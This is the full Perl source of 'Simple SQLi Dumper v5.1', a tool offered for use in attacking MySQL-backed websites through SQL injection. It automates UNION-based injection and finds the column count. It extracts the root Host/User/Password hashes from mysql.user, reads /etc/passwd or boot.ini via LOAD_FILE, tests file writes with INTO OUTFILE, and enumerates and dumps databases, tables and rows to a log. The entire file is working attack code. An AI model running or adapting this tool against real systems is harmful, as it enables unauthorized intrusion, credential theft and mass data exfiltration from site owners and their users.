#!/usr/bin/perl

#*******************************************#
#  Simple SQLi Dumper v5.1 for MySQL        #
#  Coded by Vrs-hCk a.k.a c0li.m0de.0n      #
#  E-Mail: ander[at]antisecurity.org        #
#  YM: vrs_hck[at]yahoo.com                 #
#  Blog: http://c0li.blogspot.com           #
#  www.antisecurity.org - www.MainHack.net  #
#*******************************************#

use HTTP::Request;
use LWP::UserAgent;
use Getopt::Long;

my $datetime = localtime;
my $OS = "$^O";
if ($OS ne 'MSWin32') { system("clear"); }

# unhex(hex()) function. 0=disable, 1=enable
$convert = 0;

$logo = "c0li";
$end = '--';
$spc = '+';
$field = 123;
$log = 'ssdp.log';

print "\n [o]=================================================[x]\n";
print "  |             Simple SQLi Dumper v5.1               |\n";
print "  |                Coded by Vrs-hCk                   |\n";
print " [o]=================================================[o]\n";
print "    Date : $datetime\n";
print "    Help Command: -h, -help, --help\n\n";

w_log("\n [o]=================================================[x]\n".
      "  |             Simple SQLi Dumper v5.1               |\n".
      "  |                Coded by Vrs-hCk                   |\n".
      " [o]=================================================[o]\n".
      "    Log Created : $datetime\n".
      "    Help Command: -h, -help, --help\n\n");

sub usage {
print "\n";
print "  |-----------------------------------------------------------------------------|\n";
print "  | Usage: perl ssdp.pl [options]                                               |\n";
print "  |                                                                             |\n";
print "  | -u [SQLi URL]       target with id parameter or sqli url with c0li string   |\n";
print "  | -e [sqli end tag]   sql injection end tag (default: \"--\")                   |\n";
print "  | -d [database name]  this option should not be used (default: \@\@database)    |\n";
print "  | -t [table name]     table_name                                              |\n";
print "  | -c [columns name]   column_name (example: id,user,pass,email)               |\n";
print "  | -s [space code]     SPACE code: +,/**/,%20 (default: \"+\")                   |\n";
print "  | -f [max field]      max field to get magic number (default: 123)            |\n";
print "  | -start [num]        row number to begin dumping data                        |\n";
print "  | -stop [num]         row number to stop dumping                              |\n";
print "  | -where [query]      your special dumping query                              |\n";
print "  |                                                                             |\n";
print "  | -log [file name]    file name to save ssdp data (default: ssdp.log)         |\n";
print "  | -p [http proxy]     hostname:port                                           |\n";
print "  |                                                                             |\n";
print "  | -magic              Find Magic Number                           [MySQL v4+] |\n";
print "  | -info               Get MySQL Information                       [MySQL v4+] |\n";
print "  | -dbase              Concat Databases                            [MySQL v5+] |\n";
print "  | -table              Concat Tables                               [MySQL v5+] |\n";
print "  | -column             Concat Columns                              [MySQL v5+] |\n";
print "  | -tabcol             Concat Tables with Columns                  [MySQL v5+] |\n";
print "  | -find               Search Columns Name                         [MySQL v5+] |\n";
print "  | -dump               Dump Data                                   [MySQL v4+] |\n";
print "  | -brute              Fuzzing Tables & Columns                    [MySQL v4+] |\n";
print "  |-----------------------------------------------------------------------------|\n";
print "   Please read ssdp-examples.txt for more info :)\n";
print "\n\n";
}

$sqli = '';
$database = '';
$table = '';
$column = '';
$proxy = '';
$start = 0;
$stop = 0;
$where = '';
$proxy = '';

GetOptions (
    "u=s" => \$sqli, "e=s" => \$end, "d=s" => \$database, "t=s" => \$table, "c=s" => \$column, "s=s" => \$spc,
    "f=i" => \$field, "start=i" => \$start, "stop=i" => \$stop, "where=s" => \$where, "log=s" => \$log, "p=s" => \$proxy,
    "info" => sub {
                    url_check();
                    print " [+] c0li SQLi URL: http://$sqli\n";
                    print " [+] SQLi End Tag: $end\n";
                    w_log(" [+] c0li SQLi URL: http://$sqli\n");
                    w_log(" [+] SQLi End Tag: $end\n");
                    proxy_test();
                    get_mysqlinfo($sqli);
                    print "\n Done.\n\n";
                    w_log("\n Done.\n\n");
                  },
    "dbase" => sub {
                     url_check();
                     print " [+] c0li SQLi URL: http://$sqli\n";
                     print " [+] SQLi End Tag: $end\n";
                     w_log(" [+] c0li SQLi URL: http://$sqli\n");
                     w_log(" [+] SQLi End Tag: $end\n");
                     proxy_test();
                     get_databases();
                   },
    "table" => sub {
                     url_check();
                     print " [+] c0li SQLi URL: http://$sqli\n";
                     print " [+] SQLi End Tag: $end\n";
                     w_log(" [+] c0li SQLi URL: http://$sqli\n");
                     w_log(" [+] SQLi End Tag: $end\n");
                     proxy_test();
                     get_tables($database);
                   },
    "column" => sub {
                      url_check();
                      if (!$table) { print " [Error] \"-t [table name]\" option is required.\n\n"; exit(); }
                      print " [+] c0li SQLi URL: http://$sqli\n";
                      print " [+] SQLi End Tag: $end\n";
                      w_log(" [+] c0li SQLi URL: http://$sqli\n");
                      w_log(" [+] SQLi End Tag: $end\n");
                      proxy_test();
                      get_columns($database,$table);
                    },
    "tabcol" => sub {
                      url_check();
                      print " [+] c0li SQLi URL: http://$sqli\n";
                      print " [+] SQLi End Tag: $end\n";
                      w_log(" [+] c0li SQLi URL: http://$sqli\n");
                      w_log(" [+] SQLi End Tag: $end\n");
                      proxy_test();
                      get_tables_columns($database);
                    },
    "find" => sub {
                    url_check();
                    if (!$column) { print " [Error] \"-c [column name]\" option is required.\n\n"; exit(); }
                    print " [+] c0li SQLi URL: http://$sqli\n";
                    print " [+] SQLi End Tag: $end\n";
                    w_log(" [+] c0li SQLi URL: http://$sqli\n");
                    w_log(" [+] SQLi End Tag: $end\n");
                    proxy_test();
                    search_columns($database,$column);
                  },
    "magic" => sub {
                     if (!$sqli) { print " [Error] \"-u [URL]\" option is required.\n\n"; exit(); }
                     if ($sqli =~ /http:\/\// ) { $sqli = str_replace($sqli,"http://",""); }
                     print " [+] URL: http://$sqli\n";
                     print " [+] End Tag: $end\n";
                     w_log(" [+] URL: http://$sqli\n");
                     w_log(" [+] End Tag: $end\n");
                     proxy_test();
                     get_magic_number($sqli);
                   },
    "dump" => sub {
                    url_check();
                    if (!$table) { print " [Error] \"-t [table name]\" option is required.\n\n"; exit(); }
                    if (!$column) { print " [Error] \"-c [columns name]\" option is required.\n\n"; exit(); }
                    print " [+] c0li SQLi URL: http://$sqli\n";
                    print " [+] SQLi End Tag: $end\n";
                    w_log(" [+] c0li SQLi URL: http://$sqli\n");
                    w_log(" [+] SQLi End Tag: $end\n");
                    proxy_test();
                    dump_data();
                  },
    "brute" => sub {
                     url_check();
                     print " [+] c0li SQLi URL: http://$sqli\n";
                     print " [+] SQLi End Tag: $end\n";
                     w_log(" [+] c0li SQLi URL: http://$sqli\n");
                     w_log(" [+] SQLi End Tag: $end\n");
                     proxy_test();
                     brute_tabcol();
                   },
    "help|h" => sub { usage(); }
);

sub url_check {
    if (!$sqli) { print " [Error] \"-u [URL]\" option is required.\n\n"; exit(); }
    if ($sqli !~ m/c0li/) { print " [Error] SQLi URL must be included \"c0li\" string.\n\n"; exit(); }
    if ($sqli =~ /http:\/\// ) { $sqli = str_replace($sqli,"http://",""); }
    if ($sqli =~ m/ /) { $sqli = str_replace($sqli," ",$spc); }
    $sqli = str_replace($sqli,"%20",$spc);
    $sqli = str_replace($sqli,"\\+",$spc);
    $sqli = str_replace($sqli,"/\\*\\*/",$spc);
    if ($proxy =~ /http:\/\// ) { $proxy = str_replace($proxy,'http://',''); }
}

sub proxy_test {
    if ($proxy) {
        syswrite(STDOUT,"\n Checking HTTP Proxy ...",26);
        w_log("\n Checking HTTP Proxy ...");
        my $ua = LWP::UserAgent->new(agent => "Mozilla/5.0");
        $ua->proxy("http", "http://".$proxy."/");
        $ua->timeout(10);
        my $request = HTTP::Request->new(GET => 'http://www.google.com/');
        my $response = $ua->request($request);
        my $content = $response->content();
        if ($content =~ m/<title>Google<\/title>/g) { print " Good :)\n"; w_log(" Good :)\n"); }
        else { print " Failed :(\n\n"; w_log(" Failed :(\n\n"); $proxy = ''; exit(); }
    }
}

sub brute_tabcol {
    open(TABLES, 'tables.dict') or die(" Cannot open or read tables.dict !!\n");
    @tables=<TABLES>;
    close(TABLES);
    open(COLUMNS, 'columns.dict') or die(" Cannot open or read columns.dict !!\n");
    @columns=<COLUMNS>;
    close(COLUMNS);
    print "\n Finding Tables & Columns ...\n\n";
    w_log("\n Finding Tables & Columns ...\n\n");
    my $inc = 0;
    while ($tbl = <@tables>) {
        my $concat = '0x21346E64337273306E21';
        my $from = $spc.'FROM'.$spc.$tbl;
        my $tbldata = ssdp_get_data($concat,$from);
        if ($tbldata eq '!4nd3rs0n!') {
            $inc++;
            syswrite(STDOUT," [$inc] $tbl: ",255);
            w_log(" [$inc] $tbl: ");
            while ($col = <@columns>) {
                my $coldata = ssdp_get_data($concat.','.$col,$from);
                if ($coldata =~ /!4nd3rs0n!/) {
                    syswrite(STDOUT,$col.',',255);
                    w_log($col.',');
                }
            } print "\n"; w_log("\n");
        }
    } print "\n Done.\n\n"; w_log("\n Done.\n\n");
}

sub get_magic_number {
    my $c0li = '';
    my $c0de = '';
    my $url = $_[0];
    my $union = $spc."AND".$spc."1=2".$spc."UNION".$spc.'ALL'.$spc."SELECT".$spc;
    print "\n Attempting to find the magic number...\n\n";
    w_log("\n Attempting to find the magic number...\n\n");
    syswrite(STDOUT," [+] Testing: ",14);
    w_log(" [+] Testing: ");
    for ($i=1; $i<=$field; $i++){
        my $bin = '4nd3rs0n'.$i.'4nd3rs3n';
        my $hex = $bin;
        $hex =~ s/(.)/sprintf("%x",ord($1))/eg;
		if (($i > 1) and ($i < $field)) {
			$c0li = $c0li.",0x".$hex;
			$c0de = $c0de.",".$bin;
		} else {
			$c0li = $c0li."0x".$hex;
			$c0de = $c0de.$bin;
		}
        syswrite(STDOUT,$i.",", 255);
        w_log($i.",");
        my $magic = '';
        my $xpl = $url.$union.$c0li.$end;
        my $content = get_content(0,$xpl);
        if (($content =~ m/4nd3rs0n/i) and ($content =~ m/4nd3rs3n/i)) {
            my $number = ssdp_mid_str('4nd3rs0n','4nd3rs3n',$content);
            my $link1 = str_replace($c0de,'4nd3rs0n'.$number.'4nd3rs3n','c0li');
            my $link2 = str_replace($link1,'4nd3rs0n','');
            my $link3 = str_replace($link2,'4nd3rs3n','');
            my $inject = $url.$union.$link3;
            print "\n\n [+] Field Length : $i\n";
            w_log("\n\n [+] Field Length : $i\n");
            print " [+] Magic Number : ";
            w_log(" [+] Magic Number : ");
            for ($x=1; $x<=$i; $x++) { if ($content =~ /4nd3rs0n[$x]4nd3rs3n/i) { print $x.','; w_log($x.','); }}
            print "\n [+] URL Injection: http://$inject\n";
            w_log("\n [+] URL Injection: http://$inject\n");
            $sqli = $inject;
            get_mysqlinfo($inject);
            last();
        }
        if ($i == $field) {
            print "\n\n Failed to get magic number. Please try it manually :)\n\n";
            w_log("\n\n Failed to get magic number. Please try it manually :)\n\n");
            exit();
        }
    }
    print "\n Done.\n\n";
    w_log("\n Done.\n\n");
}

sub get_mysqlinfo {
    my $url = $_[0];
    $load_file = '2F6574632F706173737764';
    $load_res = "root:(.+):(.+):(.+):(.+):(.+):(.+)";
    $test_file = '/tmp/c0li-'.(int rand(666)).'.txt';
    $read_file = $test_file;
    $read_file =~ s/(.)/sprintf("%x",ord($1))/eg;
    my $ver_concat = 'CONCAT_WS(0x3a,0x2163306C69,database(),user(),version(),@@version_compile_os,0x63306C6921)';
    if ($convert) { $ver_concat = 'UNHEX(HEX(CONCAT_WS(0x3a,0x2163306C69,database(),user(),@@version,@@version_compile_os,0x63306C6921)))'; }
    my $ver_select = str_replace($url,'c0li',$ver_concat);
    print "\n Showing MySQL Information ...\n\n";
    w_log("\n Showing MySQL Information ...\n\n");
    my $ver_content = get_content(0,$ver_select.$end);
    if ($ver_content =~ /!c0li:(.+?):(.+?):(.+?):(.+?):c0li!/i) {
        my ($db_name,$usr,$ver,$os) = ($1,$2,$3,$4);
        print " [+] Database: $db_name\n";
        print " [+] User: $usr\n";
        print " [+] Version: $ver\n";
        print " [+] System: $os\n";
        w_log(" [+] Database: $db_name\n");
        w_log(" [+] User: $usr\n");
        w_log(" [+] Version: $ver\n");
        w_log(" [+] System: $os\n");
        if (($os =~ /nt/i) or ($os =~ /win/i)) {
            $load_file = '633A2F626F6F742E696E69';
            $load_res = 'Boot Loader';
            $test_file = '/c0li-'.(int rand(666)).'.txt';
            $read_file = $test_file;
            $read_file =~ s/(.)/sprintf("%x",ord($1))/eg;
        }
        my $acc_concat = 'CONCAT_WS(0x3a,0x2163306C69,Host,User,Password,0x63306C6921)';
        if ($convert) { $acc_concat = 'UNHEX(HEX(CONCAT_WS(0x3a,0x2163306C69,Host,User,Password,0x63306C6921)))'; }
        my $acc_select = str_replace($url,'c0li',$acc_concat);
        my $acc_content = get_content(0,$acc_select.$spc.'FROM'.$spc.'mysql.user'.$spc.'where'.$spc.'user=0x726F6F74'.$end);
        if ($acc_content =~ /!c0li:(.+?):(.+?):(.+?):c0li!/i) {
            print " [+] Access to \"mysql\" Database: Yes (w00t)\n";
            print "     [-] Host: $1\n";
            print "     [-] User: $2\n";
            print "     [-] Pass: $3\n";
            w_log(" [+] Access to \"mysql\" Database: Yes (w00t)\n");
            w_log("     [-] Host: $1\n");
            w_log("     [-] User: $2\n");
            w_log("     [-] Pass: $3\n");
        } else { print " [+] Access to \"mysql\" Database: No\n"; w_log(" [+] Access to \"mysql\" Database: No\n"); }
        my $file_concat = 'LOAD_FILE(0x'.$load_file.')';
        my $file_select = str_replace($url,'c0li',$file_concat);
        my $file_content = get_content(0,$file_select.$end);
        if ($file_content =~ /$load_res/i) {
            $load_file =~ s/([a-fA-F0-9][a-fA-F0-9])/chr(hex($1))/eg;
            print " [+] Read File \"$load_file\": Yes (w00t)\n";
            w_log(" [+] Read File \"$load_file\": Yes (w00t)\n");
            my $create_concat = '0x63306C692E6D3064652E306E';
            my $create_select = str_replace($url,'c0li',$create_concat);
            my $create_query = $spc.'INTO'.$spc.'OUTFILE'.$spc.'"'.$test_file.'"';
            $undefine = get_content(0,$create_select.$create_query.$end); $undefine = '';
            my $read_concat = 'LOAD_FILE(0x'.$read_file.')';
            my $read_select = str_replace($url,'c0li',$read_concat);
            my $file_content = get_content(0,$read_select.$end);
            if ($file_content =~ /c0li.m0de.0n/i) { print " [+] Create File \"$test_file\": Yes (w00t)\n";
            w_log(" [+] Create File \"$test_file\" : Yes (w00t)\n"); }
            else { print " [+] Create File \"$test_file\": No\n"; w_log(" [+] Create File \"$test_file\": No\n"); }
        }
        else { $load_file =~ s/([a-fA-F0-9][a-fA-F0-9])/chr(hex($1))/eg;
            print " [+] Read File \"$load_file\": No\n";
            w_log(" [+] Read File \"$load_file\": No\n");
        }
    }
    else {
        print " Failed to get MySQL Information.\n";
        w_log(" Failed to get MySQL Information.\n");
    }
}

sub get_databases {
    my $schema = $spc.'FROM'.$spc.'INFORMATION_SCHEMA.SCHEMATA'.$spc.'WHERE'.$spc.
    'SCHEMA_NAME'.$spc.'NOT'.$spc.'IN'.$spc.'(0x696E666F726D6174696F6E5F736368656D61)';
    my $count = ssdp_get_data('COUNT(*)',$schema);
    print "\n Showing databases ...\n\n";
    w_log("\n Showing databases ...\n\n");
    syswrite(STDOUT, " [+] DATABASES($count): ", 255);
    w_log(" [+] DATABASES($count): ");
    for ($i=0; $i<$count; $i++) {
        my $inc = ($i+1);
        my $query = $schema.$spc.'LIMIT'.$spc.$i.',1';
        my $db_name = ssdp_get_data('SCHEMA_NAME',$query);
        if (($inc>0) and ($inc<$count)) { $db_name = $db_name.','; }
        syswrite(STDOUT,$db_name,255);
        w_log($db_name);
    }
    print "\n\n Done.\n\n";
    w_log("\n\n Done.\n\n");
}

sub get_tables {
    my $dbhex = $_[0];
    $dbhex =~ s/(.)/sprintf("%x",ord($1))/eg;
    my $tbl_schema = $spc.'FROM'.$spc.'INFORMATION_SCHEMA.TABLES'.$spc.'WHERE'.$spc.'TABLE_SCHEMA=0x'.$dbhex;
    if (!$database) { $tbl_schema = $spc.'FROM'.$spc.'INFORMATION_SCHEMA.TABLES'.$spc.'WHERE'.$spc.'TABLE_SCHEMA=database()';
    print " [+] Database Name: database()\n"; w_log(" [+] Database Name: database()\n")}
    else { print " [+] Database Name: $database\n"; w_log(" [+] Database Name: $database\n");}
    my $tbl_count = ssdp_get_data('COUNT(*)',$tbl_schema);
    print " [+] Number of Tables: $tbl_count\n\n";
    print " Showing tables ...\n\n";
    w_log(" [+] Number of Tables: $tbl_count\n\n");
    w_log(" Showing tables ...\n\n");
    for ($i=0; $i<$tbl_count; $i++) {
        my $inc = ($i+1);
        my $query = $tbl_schema.$spc.'LIMIT'.$spc.$i.',1';
        my $tbl_name = ssdp_get_data('TABLE_NAME',$query);
        my $data_schema = $spc.'FROM'.$spc.$database.'.'.$tbl_name;
        if (!$database) { $data_schema = $spc.'FROM'.$spc.$tbl_name; }
        my $data_count = ssdp_get_data('COUNT(*)',$data_schema);
        syswrite(STDOUT," [".$inc."] ".$tbl_name."($data_count)\n", 255);
        w_log(" [".$inc."] ".$tbl_name."($data_count)\n");
    }
    print "\n Done.\n\n";
    w_log("\n Done.\n\n");
}

sub get_columns {
    my $dbhex = $_[0];
    $dbhex =~ s/(.)/sprintf("%x",ord($1))/eg;
    my $tblhex = $_[1];
    $tblhex =~ s/(.)/sprintf("%x",ord($1))/eg;
    my $col_schema = $spc.'FROM'.$spc.'INFORMATION_SCHEMA.COLUMNS'.$spc.'WHERE'.$spc.'TABLE_SCHEMA=0x'.
    $dbhex.$spc.'AND'.$spc.'TABLE_NAME=0x'.$tblhex;
    if (!$database) { $col_schema = $spc.'FROM'.$spc.'INFORMATION_SCHEMA.COLUMNS'.$spc.'WHERE'.$spc.'TABLE_SCHEMA='.
    'database()'.$spc.'AND'.$spc.'TABLE_NAME=0x'.$tblhex;
    print " [+] Database Name: database()\n"; w_log(" [+] Database Name: database()\n"); }
    else { print " [+] Database Name: $database\n";    w_log(" [+] Database Name: $database\n"); }
    my $col_count = ssdp_get_data("COUNT(*)",$col_schema);
    my $data_schema = $spc.'FROM'.$spc.$database.'.'.$table;
    if (!$database) { $data_schema = $spc.'FROM'.$spc.$table; }
    my $data_count = ssdp_get_data('COUNT(*)',$data_schema);
    print " [+] Table Name: $table\n";
    print " [+] Number of Columns: $col_count\n\n";
    print " Showing columns from table \"$table\" ...\n\n";
    w_log(" [+] Table Name: $table\n");
    w_log(" [+] Number of Columns: $col_count\n\n");
    w_log(" Showing columns from table \"$table\" ...\n\n");
    syswrite(STDOUT, " [+] ".$table."\($data_count\): ", 255);
    for ($i=0; $i<$col_count; $i++) {
        my $inc = ($i+1);
        my $query = $col_schema.$spc.'LIMIT'.$spc.$i.',1';
        my $col_name = ssdp_get_data('COLUMN_NAME',$query);
        if (($inc>0) and ($inc<$col_count)) { $col_name = $col_name.','; }
        syswrite(STDOUT,$col_name,255);
        w_log($col_name);
    }
    print "\n\n Done.\n\n";
    w_log("\n\n Done.\n\n");
}

sub get_tables_columns {
    my $dbhex = $_[0];
    $dbhex =~ s/(.)/sprintf("%x",ord($1))/eg;
    my $tbl_schema = $spc.'FROM'.$spc.'INFORMATION_SCHEMA.TABLES'.$spc.'WHERE'.$spc.'TABLE_SCHEMA=0x'.$dbhex;
    if (!$database) { $tbl_schema = $spc.'FROM'.$spc.'INFORMATION_SCHEMA.TABLES'.$spc.'WHERE'.$spc.'TABLE_SCHEMA=database()';
    print " [+] Database Name: database()\n"; w_log(" [+] Database Name: database()\n"); }
    else { print " [+] Database Name: $database\n";    w_log(" [+] Database Name: $database\n"); }
    my $tbl_count = ssdp_get_data('COUNT(*)',$tbl_schema);
    print " [+] Number of Tables: $tbl_count\n";
    print "\n Showing Tables & Columns ...\n\n";
    w_log(" [+] Number of Tables: $tbl_count\n");
    w_log("\n Showing Tables & Columns ...\n\n");
    for ($i=0; $i<$tbl_count; $i++) {
        my $tbl_inc = ($i+1);
        my $tbl_query = $tbl_schema.$spc.'LIMIT'.$spc.$i.',1';
        my $tbl_name = ssdp_get_data('TABLE_NAME',$tbl_query);
        my $data_schema = $spc.'FROM'.$spc.$database.'.'.$tbl_name;
        if (!$database) { $data_schema = $spc.'FROM'.$spc.$tbl_name; }
        my $data_count = ssdp_get_data('COUNT(*)',$data_schema);
        syswrite(STDOUT," [$tbl_inc] ".$tbl_name."($data_count): ", 255);
        w_log(" [$tbl_inc] ".$tbl_name."($data_count): ");
        my $tblhex = $tbl_name;
        $tblhex =~ s/(.)/sprintf("%x",ord($1))/eg;
        my $col_schema = $spc.'FROM'.$spc.'INFORMATION_SCHEMA.COLUMNS'.$spc.'WHERE'.$spc.'TABLE_SCHEMA=0x'.
        $dbhex.$spc.'AND'.$spc.'TABLE_NAME=0x'.$tblhex;
        if (!$database) { $col_schema = $spc.'FROM'.$spc.'INFORMATION_SCHEMA.COLUMNS'.$spc.'WHERE'.$spc.'TABLE_SCHEMA='.
        'database()'.$spc.'AND'.$spc.'TABLE_NAME=0x'.$tblhex; }
        my $col_count = ssdp_get_data('COUNT(*)',$col_schema);
        for ($x=0; $x<$col_count; $x++) {
            my $col_inc = ($x+1);
            my $col_query = $col_schema.$spc.'LIMIT'.$spc.$x.',1';
            my $col_name = ssdp_get_data('COLUMN_NAME',$col_query);
            if (($col_inc>0) and ($col_inc<$col_count)) { $col_name = $col_name.','; }
            syswrite(STDOUT,$col_name,255);
            w_log($col_name);
        }
        print "\n"; w_log("\n");
    }
    print "\n Done.\n\n"; w_log("\n Done.\n\n");
}

sub dump_data {
    my $concat = 'CONCAT_WS(0x203A20,'.$column.')';
    my $data_schema = $spc.'FROM'.$spc.$database.'.'.$table;
    if (!$database) { $data_schema = $spc.'FROM'.$spc.$table; print "\n [+] Database Name: database()\n"; }
    else { print "\n [+] Database Name: $database\n"; }
    my $data_count = ssdp_get_data('COUNT(*)',$data_schema);
    if (!$data_count) { print " Failed to get data count.\n\n Halted.\n\n";
    w_log(" Failed to get data count.\n\n Halted.\n\n"); exit(); };
    if ($data_count == 0) { print " No data. Operation halted.\n\n";
    w_log(" No data. Operation halted.\n\n"); exit(); };
    print " [+] Table Name: $table\n";
    print " [+] Column Name: $column\n";
    print " [+] Data Count: $data_count\n";
    w_log(" [+] Table Name: $table\n");
    w_log(" [+] Column Name: $column\n");
    w_log(" [+] Data Count: $data_count\n");
    if ($where ne '') {
        print "\n Special Dump Query: WHERE $where\n";
        w_log("\n Special Dump Query: WHERE $where\n");
        $where = str_replace($where,' ',$spc);
        my $where_count = ssdp_get_data('COUNT(*)',$data_schema.$spc.'WHERE'.$spc.$where);
        print "\n Dumping $where_count Data ...\n\n";
        w_log("\n Dumping $where_count Data ...\n\n");
        for ($x=0; $x<=$where_count-1; $x++) {
            my $inc = ($x+1);
            my $where_query = $data_schema.$spc.'WHERE'.$spc.$where.$spc.'LIMIT'.$spc.$x.',1';
            my $dumping = ssdp_get_data($concat,$where_query);
            if ($dumping eq '') { print " [$inc] No data. Operation halted.\n\n";
            w_log(" [$inc] No data. Operation halted.\n\n"); exit(); }
            open(LOG,">>$log") || die(" [$logo] Cannot open file.\n");
            print LOG "$dumping\n";
            close(LOG);
            print " [$inc] $dumping\n";
        }
        print "\n Done.\n\n";
        w_log("\n Done.\n\n");
    }
    else {
        print "\n Dumping Data ...\n\n";
        w_log("\n Dumping Data ...\n\n");
        if ($start == 0 and $stop == 0) { $start = 0; $stop = $data_count -1; }
        for ($i=$start; $i<=$stop; $i++) {
            my $inc = ($i+1);
            my $query = $data_schema.$spc.'LIMIT'.$spc.$i.',1';
            my $dumping = ssdp_get_data($concat,$query);
            if ($dumping eq '') { $dumping = '<no data>'; }
            open(LOG,">>$log") || die(" [$logo] Cannot open file.\n");
            print LOG "$dumping\n";
            close(LOG);
            print " [$inc] $dumping\n";
        }
        print "\n Done.\n\n";
        w_log("\n Done.\n\n");
    }
}

sub search_columns {
    my $dbhex = $_[0];
    $dbhex =~ s/(.)/sprintf("%x",ord($1))/eg;
    my $colhex = $_[1];
    $colhex =~ s/(.)/sprintf("%x",ord($1))/eg;
    my $concat = 'TABLE_SCHEMA,0x2e,TABLE_NAME,0x2e,COLUMN_NAME';
    my $schema = $spc.'FROM'.$spc.'INFORMATION_SCHEMA.COLUMNS'.$spc.'WHERE'.$spc.'TABLE_SCHEMA=0x'.
    $dbhex.$spc.'AND'.$spc.'COLUMN_NAME'.$spc.'LIKE'.$spc.'(0x25'.$colhex.'25)';
    if (!$database) { $schema = $spc.'FROM'.$spc.'INFORMATION_SCHEMA.COLUMNS'.$spc.'WHERE'.$spc.'TABLE_SCHEMA='.
    'database()'.$spc.'AND'.$spc.'COLUMN_NAME'.$spc.'LIKE'.$spc.'(0x25'.$colhex.'25)';
    print " [+] Database Name: database()\n"; w_log(" [+] Database Name: database()\n"); }
    else { print " [+] Database Name: $database\n"; w_log(" [+] Database Name: $database\n"); }
    print "\n Searching for Columns Name like *$column* ...\n\n";
    print " [+] Columns Found: \n\n";
    w_log("\n Searching for Columns Name like *$column* ...\n\n");
    w_log(" [+] Columns Found: \n\n");
    my $status = 1;
    my $i = 0;
    while ($status == 1) {
        my $inc = ($i+1);
        my $col_query = $schema.$spc.'LIMIT'.$spc.$i.',1';
        my $result = ssdp_get_data($concat,$col_query);
        if (($result eq '') and ($i == 0)) { print " [$inc] No data. Operation halted.\n\n Done.\n\n";
        w_log(" [$inc] No data. Operation halted.\n\n Done.\n\n"); exit(); }
        elsif ($result eq '') { print "\n Done.\n\n"; w_log("\n Done.\n\n"); exit(); }
        print " [$inc] $result\n";
        w_log(" [$inc] $result\n");
        $i++;
    }
}

sub ssdp_get_data {
    my $select = $_[0];
    my $filter = $_[1];
    my $data = '';
    my $concat = 'CONCAT(0x63306C6923,'.$select.',0x2363306C69)';
    if ($convert) { $concat = 'UNHEX(HEX(CONCAT(0x63306C6923,'.$select.',0x2363306C69)))'; }
    my $query = str_replace($sqli,'c0li',$concat);
    my $content = get_content(0,$query.$filter.$end);
    if ($content =~ /c0li/i) { $data = ssdp_mid_str('c0li#','#c0li',$content); }
    if ($data eq '') { return ''; }
    return $data;
}

sub ssdp_mid_str {
    my $left = $_[0];
    my $right = $_[1];
    my $string = $_[2];
    my @exp = split($left,$string);
    my @data = split($right,$exp[1]);
    return $data[0];
}

sub str_replace {
    my $source  = shift;
    my $search  = shift;
    my $replace = shift;
    $source =~ s/$search/$replace/ge;
    return $source;
}

sub get_content {
    my $timeout = $_[0];
    my $url = $_[1];
    my $ua  = LWP::UserAgent->new(agent => "Mozilla/5.0");
    if ($proxy) { $ua->proxy("http", "http://".$proxy."/"); }
    if ($timeout == 1) { $ua->timeout(10); }
    my $req = HTTP::Request->new(GET => 'http://'.$url);
    my $response = $ua->request($req);
    if ($timeout == 1) { if ($response->is_error) { print "\n [$logo] [timeout]\n"; }}
    return $response->content;
}

sub w_log {
    my $data = $_[0];
    open(LOG,">>$log") or die(" [!] Cannot create or open log file.\n\n");
    print LOG "$data";
    close(LOG);
}

# c0li.m0de.0n